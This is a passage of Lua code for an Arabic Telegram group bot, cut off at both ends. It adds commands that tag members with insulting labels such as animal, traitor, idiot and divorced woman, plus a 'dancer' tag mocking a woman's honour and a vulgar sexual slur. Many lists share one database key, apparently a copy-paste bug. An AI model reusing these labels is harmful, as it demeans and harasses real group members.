if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع حيوان في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل حيوان")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل حيوان من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الخينات' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للخينات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة الخاينين الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← خاينه [@"..username.."]\n"
else
t = t..""..k.."← خاينه"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد خاينين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خاينه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع خاينه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خاينه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل خاينه من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح العبايط' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للعبايط") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة عبايط الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← عبيط [@"..username.."]\n"
else
t = t..""..k.."← عبيط"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد عبط"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع عبيط") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع عبيط في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل عبيط")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل عبيط من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح مرتاتي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك لمرتاتي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة مرتات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← مراتي [@"..username.."]\n"
else
t = t..""..k.."← مراتي"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مرتات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مراتي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع مراتي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مراتي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل مراتي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح خطيبتي' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك لخطيبتي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة خطيبات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← خطيبتي [@"..username.."]\n"
else
t = t..""..k.."← خطيبتي"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد خطيبه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خطيبتي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع خطيبتي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خطيبتي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل خطيبتي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح العلوق' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للعلوق") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة علوق الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← علق [@"..username.."]\n"
else
t = t..""..k.."← علق"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد علوق"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع علق") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع علق في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل علق")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل علق من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الاغبياء' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للاغبياء") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة اغبياء الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← غبي [@"..username.."]\n"
else
t = t..""..k.."← غبي"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد اغبياء"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع غبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع غبي في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل غبي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل غبي من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح المطلقات' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع المطلقات')
end
if text == ("تاك للمطلقات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمه مطلقات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← مطلقه [@"..username.."]\n"
else
t = t..""..k.."← مطلقه"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مطلقات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع مطلقه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع مطلقه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل مطلقه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل مطلقه من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح خاين' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع الخاينين')
end
if text == ("تاك للخاينين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة الخاينين الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← خاين [@"..username.."]\n"
else
t = t..""..k.."← خاين"..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد خاينين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خاين") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local  statuss  = '\n ◉ تم رفع خاين في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خاين")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status  = '\n ◉ تم تنزيل خاين من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الرقصات' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع زواحف')
end
if text == ("تاك للرقاصات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ◉ قائمة رقاصات الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الرقاصه [@"..username.."]\n"
else
t = t..""..k.."» الرقاصه "..v.."\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد رقاصات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع رقاصه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
local statuss = '\n ◉ تم رفع رقاصه في الجروب\n ◉ مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل رقاصه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local UU_Le2 = database:get(bot_id..'text:ch:user')
if UU_Le2 then
send(msg.chat_id_, msg.id_,'['..UU_Le2..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'UU_Le2')..')'
status = '\n ◉ تم تنزيل رقاصه من الجروب\n ◉ بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل المتناكين' and Mod(msg) then
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم تنزيل جميع جريزي')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n ◉ قائمة المتناكين الجروب \n•━═━═━═『𝙰𝚕𝚏𝚊』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
